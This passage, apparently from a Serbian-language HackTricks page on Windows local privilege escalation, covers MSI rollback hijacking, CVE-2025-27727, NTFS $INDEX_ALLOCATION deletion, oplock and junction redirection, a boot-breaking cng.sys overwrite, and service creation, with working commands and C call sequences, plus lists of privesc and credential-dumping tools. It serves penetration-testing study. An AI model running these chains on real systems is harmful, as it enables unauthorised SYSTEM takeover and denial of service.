Validacija samo korena pod kontrolom napadača i njegovog neposrednog deteta ne obezbeđuje rekurzivno brisanje zasnovano na putanji. Ostavite te proverene objekte legitimnim, a junction/oplock zamenu premestite u dodatno dete ispod njih; `IFileOperation::DeleteItem` će na kraju stići do nevalidiranog potomka i pratiti njegovu novu metu. CVE-2026-20941 nastao je upravo zbog ovakve nepotpune ispravke, nakon što je prva Recall zakrpa validirala `UKP` i direktorijum nazvan po GUID-u, ali zadržala staru rekurzivnu operaciju brisanja.<sup>[[43]](#references)</sup>

Bezbedan obrazac je da otvorite **svakog potomka** relativno u odnosu na već pouzdanu ručku direktorijuma, pribavite i proverite konačnu razrešenu putanju/objekat i primenite oznaku za brisanje na tu proverenu ručku. Nemojte validirati prefiks, a zatim se vratiti na rekurzivno brisanje zasnovano na putanji. Tokom pregleda zakrpe, proverite i strukture na stvarnom mestu poziva: u ovom slučaju, analiza izvršavanja strukture `OBJECT_ATTRIBUTES` pri `NtCreateFile` pokazala je da `RootDirectory` nije null i da je ime relativno: `{GUID}\\secure_file.lock`. Time je opovrgnut obmanjujući izlaz dekompilatora koji je ukazivao na drugi primitiv `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Od proizvoljnog brisanja/premeštanja/preimenovanja fascikle do SYSTEM EoP

Tehnika opisana [**u ovom blog postu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), sa exploit kodom [**dostupnim ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Napad se u osnovi sastoji od zloupotrebe Windows Installer funkcije rollback kako bi se legitimne datoteke zamenile zlonamernim tokom procesa deinstalacije. Za to napadač mora da napravi **zlonamerni MSI installer** koji će se upotrebiti za preuzimanje kontrole nad fasciklom `C:\Config.Msi`. Windows Installer će je kasnije koristiti za čuvanje rollback datoteka tokom deinstalacije drugih MSI paketa; te rollback datoteke bi bile izmenjene tako da sadrže zlonamerni payload.

### Ubacivanje putanje za čišćenje Windows Installer COM-a (CVE-2025-27727)

Klijent sa niskim privilegijama može da dođe do SYSTEM `msiexec.exe` servisa preko COM objekta `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Obrnutim inženjeringom utvrđeno je da su relevantni pozivi `IMsiServer` interfejsa `MsiBeginTransactionW` na vtable offset-u `0xA0`, `SetEEUIDirectoryAndFilter` na `0xC8` i `CleanupTempPackages` na `0x50`. Ovi nazivi i offset-i utvrđeni su obrnutim inženjeringom i mogu se razlikovati među build-ovima.<sup>[[41]](#references)</sup>

Za korisnika koji nije administrator, `SetEEUIDirectoryAndFilter` impersonira pozivaoca samo dok otvara prosleđenu putanju sa `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Time se dokazuje da pozivalac može da obriše direktorijum i sprečava praćenje reparse point-a, ali se **ne** povezuje provereni objekat datoteke sa kasnijim čišćenjem niti dokazuje da ga je kreirao Windows Installer.<sup>[[41]](#references)</sup>

Nakon `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` zakazuje putanju kao fasciklu bez obzira na argument filtera koji je prosledio pozivalac. Servis upisuje imenovanu vrednost `REG_DWORD` pod `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: ime vrednosti je putanja pod kontrolom pozivaoca, a podaci `0x00000002` predstavljaju zastavicu fascikle. Zatim `CleanupTempPackages(NULL, FALSE)` direktno pokreće čišćenje. Njegova privilegovana radna nit enumeriše vrednosti registra i prosleđuje stavke fascikli rekurzivnoj funkciji `FDeleteFolder`, bez provere porekla putanje. Ako uobičajeno uklanjanje ne uspe, kod poziva i `LockdownPath`, uklanja atribute datoteke i pokušava ponovo.<sup>[[41]](#references)</sup>

Minimalni redosled poziva rekonstruisan iz `msi.dll` je:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Korisna primitiva je ponovno korišćenje putanje, a ne preusmeravanje junction-om. Registrujte `C:\Config.Msi` koji je napravio napadač, uklonite ga i dozvolite Windows Installer-u da kasnije ponovo kreira istu putanju sa zaštićenim rollback podacima. Čišćenje veruje zastarelom imenu `TempPackages` i briše novi direktorijum kao SYSTEM. Ovo zaobilazi predviđenu granicu koju nameću `FILE_FLAG_OPEN_REPARSE_POINT` i ublažavanje rizika poverenja u preusmeravanje, jer nije potreban reparse point.<sup>[[41]](#references)</sup>

Ova primitiva za brisanje uklapa se u rollback lanac ispod: sačuvajte zaseban zapis `Installer\Folders`, obrišite zaštićeni `C:\Config.Msi`, ponovo ga kreirajte sa NULL DACL-om i zadržite handle kojem je dodeljen `WRITE_DAC` pre nego što installer učvrsti DACL. Unapred otvoreni handle može da vrati permisivni DACL pomoću `NtSetSecurityObject`, nakon čega se generisani `.rbs` može zameniti pre nego što se rollback nastavi.<sup>[[41]](#references)</sup>

Microsoft je ispravio putanju tako što je sprečio `CMsiTransaction::SetEEUIDirectoryAndFilter` da pozove `ScheduleFileOrFolderDelete` kada je omogućena nova feature gate opcija. COM poziv i dalje može da vrati uspeh, ali više ne dodaje putanju koju kontroliše napadač u `TempPackages`. Instalirajte bezbednosna ažuriranja za Windows iz aprila 2025. umesto da uspešan povratak metode koristite kao test zakrpe.<sup>[[41]](#references)[[42]](#references)</sup>

Sažeta tehnika je sledeća:

1. **Faza 1 – Priprema za hijacking (ostavite `C:\Config.Msi` praznim)**

- Korak 1: Instalirajte MSI
    - Napravite `.msi` koji instalira bezopasnu datoteku (npr. `dummy.txt`) u direktorijum sa dozvolom za pisanje (`TARGETDIR`).
    - Označite installer kao **"UAC Compliant"**, kako bi mogao da ga pokrene **korisnik koji nije administrator**.
    - Zadržite otvoren **handle** za datoteku nakon instalacije.

- Korak 2: Započnite deinstalaciju
    - Deinstalirajte isti `.msi`.
    - Proces deinstalacije počinje premeštanjem datoteka u `C:\Config.Msi` i njihovim preimenovanjem u `.rbf` datoteke (rollback rezervne kopije).
    - **Proveravajte otvoreni handle** pomoću `GetFinalPathNameByHandle` da biste otkrili kada datoteka postane `C:\Config.Msi\<random>.rbf`.

- Korak 3: Prilagođena sinhronizacija
    - `.msi` sadrži **prilagođenu akciju deinstalacije (`SyncOnRbfWritten`)** koja:
        - Signalizira kada je `.rbf` zapisan.
        - Zatim **čeka** na drugi događaj pre nego što nastavi deinstalaciju.

- Korak 4: Sprečite brisanje `.rbf` datoteke
    - Kada dobijete signal, **otvorite `.rbf` datoteku** bez `FILE_SHARE_DELETE` — time se **sprečava njeno brisanje**.
    - Zatim **pošaljite signal nazad** kako bi se deinstalacija završila.
    - Windows Installer ne uspeva da obriše `.rbf` datoteku, a pošto ne može da obriše sav sadržaj, **`C:\Config.Msi` se ne uklanja**.

- Korak 5: Ručno obrišite `.rbf` datoteku
    - Vi (napadač) ručno brišete `.rbf` datoteku.
    - Sada je **`C:\Config.Msi` prazan**, spreman za hijacking.

> U ovom trenutku **pokrenite ranjivost za brisanje proizvoljnog direktorijuma na nivou SYSTEM-a** da biste obrisali `C:\Config.Msi`.

2. **Faza 2 – Zamena rollback skripti zlonamernim skriptama**

- Korak 6: Ponovo kreirajte `C:\Config.Msi` sa slabim ACL-ovima
    - Sami ponovo kreirajte direktorijum `C:\Config.Msi`.
    - Postavite **slabe DACL-ove** (npr. Everyone:F) i **zadržite otvoren handle** sa `WRITE_DAC`.

- Korak 7: Pokrenite drugu instalaciju
    - Ponovo instalirajte `.msi` sa sledećim vrednostima:
        - `TARGETDIR`: Lokacija sa dozvolom za pisanje.
        - `ERROROUT`: Promenljiva koja izaziva prinudnu grešku.
    - Ova instalacija će se koristiti za ponovno pokretanje **rollback-a**, koji čita `.rbs` i `.rbf`.

- Korak 8: Nadgledajte pojavu `.rbs` datoteke
    - Pomoću `ReadDirectoryChangesW` nadgledajte `C:\Config.Msi` dok se ne pojavi nova `.rbs` datoteka.
    - Zabeležite njeno ime.

- Korak 9: Sinhronizujte se pre rollback-a
    - `.msi` sadrži **prilagođenu instalacionu akciju (`SyncBeforeRollback`)** koja:
        - Signalizira događaj kada se kreira `.rbs`.
        - Zatim **čeka** pre nego što nastavi.

- Korak 10: Ponovo primenite slabe ACL-ove
    - Nakon što primite događaj `.rbs created`:
        - Windows Installer **ponovo primenjuje jake ACL-ove** na `C:\Config.Msi`.
        - Pošto i dalje imate handle sa `WRITE_DAC`, možete **ponovo da primenite slabe ACL-ove**.

> ACL-ovi se **proveravaju samo prilikom otvaranja handle-a**, tako da i dalje možete da pišete u direktorijum.

- Korak 11: Postavite lažne `.rbs` i `.rbf` datoteke
    - Zamenite `.rbs` datoteku **lažnom rollback skriptom** koja nalaže Windows-u da:
        - Vrati vašu `.rbf` datoteku (zlonamerni DLL) u **privilegovanu lokaciju** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Postavite lažnu `.rbf` datoteku koja sadrži **zlonamerni DLL payload na nivou SYSTEM-a**.

- Korak 12: Pokrenite rollback
    - Pošaljite signal sinhronizacionom događaju kako bi se installer nastavio.
    - **Prilagođena akcija tipa 19 (`ErrorOut`)** konfigurisana je tako da **namerno izazove grešku instalacije** u poznatoj tački.
    - Time započinje **rollback**.

- Korak 13: SYSTEM instalira vaš DLL
    - Windows Installer:
        - Čita vaš zlonamerni `.rbs`.
        - Kopira vaš DLL iz `.rbf` datoteke na ciljnu lokaciju.
    - Sada se vaš **zlonamerni DLL nalazi na putanji koju učitava SYSTEM**.

- Završni korak: Izvršite SYSTEM kod
    - Pokrenite pouzdani **auto-elevated binarni fajl** (npr. `osk.exe`) koji učitava DLL za koji ste izvršili hijacking.
    - **Gotovo**: vaš kod se izvršava **kao SYSTEM**.


### Od proizvoljnog brisanja/pomeranja/preimenovanja datoteka do SYSTEM EoP

Glavna MSI rollback tehnika (prethodna) pretpostavlja da možete da obrišete **ceo direktorijum** (npr. `C:\Config.Msi`). Ali šta ako vaša ranjivost omogućava samo **proizvoljno brisanje datoteka**?

Možete da iskoristite **NTFS interne mehanizme**: svaki direktorijum ima skriveni alternativni tok podataka koji se zove:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ovaj tok čuva **metapodatke indeksa** fascikle.

Dakle, ako **obrišete tok `::$INDEX_ALLOCATION`** fascikle, NTFS **uklanja celu fasciklu** iz sistema datoteka.

To možete uraditi pomoću standardnih API-ja za brisanje datoteka, kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Iako pozivate API za brisanje *fajla*, on **briše samu fasciklu**.

### Od brisanja sadržaja fascikle do SYSTEM EoP
Šta ako vam primitive ne dozvoljava da brišete proizvoljne fajlove/fascikle, ali vam **dozvoljava da brišete *sadržaj* fascikle pod kontrolom napadača**?

1. Korak 1: Napravite fasciklu mamac i fajl
- Napravite: `C:\temp\folder1`
- U njoj napravite: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- **Oplock** **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Korak 3: Pokrenite SYSTEM proces (npr., `SilentCleanup`)
- Ovaj proces skenira fascikle (npr., `%TEMP%`) i pokušava da izbriše njihov sadržaj.
- Kada dođe do `file1.txt`, **oplock se aktivira** i predaje kontrolu vašem callback-u.

4. Korak 4: Unutar oplock callback-a – preusmerite brisanje

- Opcija A: Premestite `file1.txt` na drugo mesto
    - Ovo prazni `folder1` bez prekidanja oplock-a.
    - Nemojte direktno brisati `file1.txt` — time bi se oplock prerano oslobodio.

- Opcija B: Pretvorite `folder1` u **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcija C: Napravite **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Ovo cilja interni NTFS tok u kojem se čuvaju metapodaci fascikle — njegovim brisanjem briše se fascikla.

5. Korak 5: Oslobodite oplock
- SYSTEM proces nastavlja i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction-a + symlink-a, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Rezultat**: `C:\Config.Msi` briše SYSTEM.

### Od kreiranja fascikle na proizvoljnoj lokaciji do trajnog DoS-a

Iskoristite primitiv koji vam omogućava da **kreirate proizvoljnu fasciklu kao SYSTEM/admin** — čak i ako **ne možete da upisujete datoteke** ili **postavljate slabe dozvole**.

Kreirajte **fasciklu** (ne datoteku) čiji je naziv **kritični Windows drajver**, npr.:
```
C:\Windows\System32\cng.sys
```

- Ova putanja obično odgovara kernel-mode drajveru `cng.sys`.
- Ako je **unapred kreirate kao fasciklu**, Windows neće uspeti da učita stvarni drajver pri pokretanju.
- Zatim Windows pokušava da učita `cng.sys` tokom pokretanja.
- Nailazi na fasciklu, **ne uspeva da pronađe stvarni drajver** i **ruši se ili zaustavlja pokretanje**.
- **Nema rezervne opcije** ni **oporavka** bez spoljne intervencije (npr. popravke pokretanja ili pristupa disku).

### Od privilegovanih putanja za logove/rezervne kopije + OM symlinks do proizvoljnog prepisivanja datoteka / DoS-a pri pokretanju

Kada **privilegovana usluga** upisuje logove/izvoze na putanju pročitanu iz **podesive konfiguracije**, preusmerite tu putanju pomoću **Object Manager symlinks + NTFS mount points** da biste privilegovani upis pretvorili u proizvoljno prepisivanje (čak i **bez** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Zahtevi**
- Konfiguracija koja čuva ciljnu putanju je upisiva za napadača (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlink-a (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Privilegovana operacija koja upisuje na tu putanju (log, izvoz, izveštaj).

**Primer lanca**
1. Pročitajte konfiguraciju da biste otkrili privilegovano odredište loga, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmerite putanju bez administratorskih privilegija:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše log (npr. administrator pokrene „send test SMS“). Upis se sada vrši u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisanu metu (hex/PE parserom) da biste potvrdili oštećenje; ponovnim pokretanjem Windows će učitati izmenjenu putanju drajvera → **DoS petljom pri pokretanju**. Ovo se može primeniti i na bilo koju zaštićenu datoteku koju će privilegovani servis otvoriti radi upisa.

> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako postoji kopija u `C:\Windows\System32\cng.sys`, prvo može biti pokušan njen pristup, što je čini pouzdanim odredištem za DoS putem oštećenih podataka.



## **Od visokog integriteta do SYSTEM**

### **Novi servis**

Ako već radite u procesu sa visokim integritetom, **putanja do SYSTEM** može biti jednostavna: samo **kreirajte i pokrenite novi servis**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Prilikom kreiranja service binary-ja, proverite da li je to validan servis ili da li binary brzo obavlja potrebne radnje, jer će biti ugašen za 20 sekundi ako nije validan servis.

### AlwaysInstallElevated

Iz procesa sa High Integrity nivoom možete pokušati da **omogućite AlwaysInstallElevated registry entries** i **instalirate** reverse shell koristeći _**.msi**_ wrapper.\
[Više informacija o uključenim registry ključevima i instalaciji _.msi_ paketa možete pronaći ovde.](#alwaysinstallelevated)

### High + SeImpersonate privilegija do System

**Možete** [**pronaći kod ovde**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do Full Token privilegija

Ako imate te token privilegije (verovatno ćete ih pronaći u već High Integrity procesu), moći ćete da **otvorite skoro svaki proces** (osim zaštićenih procesa) koristeći SeDebug privilegiju, **kopirate token** procesa i kreirate **proizvoljan proces sa tim tokenom**.\
Ovom tehnikom se obično **bira bilo koji proces koji radi kao SYSTEM i ima sve token privilegije** (_da, možete pronaći SYSTEM procese bez svih token privilegija_).\
**Primer koda koji izvršava predloženu tehniku možete** [**pronaći ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za eskalaciju u `getsystem`. Tehnika podrazumeva **kreiranje pipe-a, a zatim kreiranje/zloupotrebu servisa koji upisuje u taj pipe**. Zatim će **server** koji je kreirao pipe, koristeći privilegiju **`SeImpersonate`**, moći da **impersonate-uje token** pipe klijenta (servisa) i dobije SYSTEM privilegije.\
Ako želite da [**saznate više o named pipes, pročitajte ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**prelaska sa high integrity na System pomoću named pipes, pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **hijack-ujete dll** koji **učitava** **proces** pokrenut kao **SYSTEM**, moći ćete da izvršite proizvoljan kod sa tim dozvolama. Zato je Dll Hijacking koristan i za ovu vrstu eskalacije privilegija; štaviše, mnogo **lakše ga je izvesti iz procesa sa high integrity nivoom**, jer on ima **write dozvole** za fascikle iz kojih se učitavaju dll-ovi.\
**Možete** [**saznati više o Dll hijacking-u ovde**](dll-hijacking/index.html)**.**

### **Od Administrator ili Network Service do System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE ili NETWORK SERVICE do punih privilegija

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Dodatna pomoć

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Korisni alati

**Najbolji alat za pronalaženje lokalnih Windows vektora za eskalaciju privilegija:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava pogrešne konfiguracije i osetljive fajlove (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detektovan.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava neke moguće pogrešne konfiguracije i prikuplja informacije (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava pogrešne konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači sačuvane informacije o sesijama iz PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP-a. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izvlači kredencijale iz Credential Manager-a. Detektovan.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Isprobava prikupljene lozinke na domenu**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell alat za ADIDNS/LLMNR/mDNS spoofing i man-in-the-middle napade.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna Windows enumeracija za privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Traži poznate privesc ranjivosti (ZASTAREO, zamenjen alatom Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(potrebna su Admin prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Traži poznate privesc ranjivosti (potrebno ga je kompajlirati pomoću VisualStudio-a) ([**prekompajlirana verzija**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriše host tražeći pogrešne konfiguracije (više služi za prikupljanje informacija nego za privesc) (potrebno ga je kompajlirati) **(**[**prekompajlirana verzija**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izvlači kredencijale iz velikog broja softvera (prekompajlirani exe na github-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port alata PowerUp u C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava pogrešne konfiguracije (prekompajlirani executable na github-u). Ne preporučuje se. Ne radi dobro u Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće pogrešne konfiguracije (exe napravljen iz pythona). Ne preporučuje se. Ne radi dobro u Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen na osnovu ovog posta (za ispravan rad mu nije potreban accesschk, ali može da ga koristi).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz komande **systeminfo** i preporučuje funkcionalne exploite (lokalni python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz komande **systeminfo** i preporučuje funkcionalne exploite (lokalni Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projekat morate kompajlirati koristeći odgovarajuću verziju .NET-a ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na victim host-u, možete pokrenuti:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Osnove eskalacije privilegija u Windows-u](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacija privilegija iskorišćavanjem slabih dozvola fascikli](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacija privilegija u Windows-u - podsetnik](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Radionica o lokalnoj eskalaciji privilegija u Windows-u / Linux-u](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Napadi na Windows: AT je novi crni (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacija privilegija - Windows - Kompletni OSCP vodič](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Eskalacija privilegija - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Vodič za eskalaciju privilegija u Windows-u](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Kontrolna lista za eskalaciju privilegija u Windows-u](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacija privilegija u Windows-u](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metode eskalacije privilegija u Windows-u za pentestere](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing putem Word VBA makroa preko SMTP-a → dešifrovanje hMailServer akreditiva → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak format string-a + stack BOF → VirtualAlloc ROP (RCE) i krađa kernel tokena](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Potera za Silver Fox-om: mačka i miš u senkama kernela](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ranjivost privilegovanog sistema datoteka prisutna u SCADA sistemu](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Alati za testiranje simboličkih linkova – upotreba CreateSymlink-a](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Veza sa prošlošću: zloupotreba simboličkih linkova u Windows-u](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: opasno razrešavanje modula u Windows-u](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js moduli: učitavanje iz fascikli `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Izazovi C/C++ kontrolne liste, rešeni](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Funkcija RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Otmica binarnih datoteka servisa](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own sa Microslop-om: ulančavanje CLDFLT i DirectX trkačkih stanja kernela za LPE u Windows-u](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jedan I/O Ring da vlada svima: potpuna primitiva za čitanje/upisivanje na Windows-u 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Zloupotreba proizvoljnog brisanja datoteka za eskalaciju privilegija i drugi korisni trikovi](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - kod exploita FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Napadi na WSUS, 2. deo: CVE-2020-1013, jednodnevni exploit za lokalnu eskalaciju privilegija u Windows-u 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Istraživanje Credential Manager-a i Windows Vault-a](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource-Based Constrained Delegation: kada promena slike dovede do eskalacije privilegija](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Izdvajanje SSH privatnih ključeva iz SSH agenta u Windows-u 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje u fabrikе backdoor-a (0_o) – 1. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje u fabrikе backdoor-a (0_o) – 2. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Eskalacija privilegija brisanjem fascikle Windows Installer-a](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: vraćanje tragovima do NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
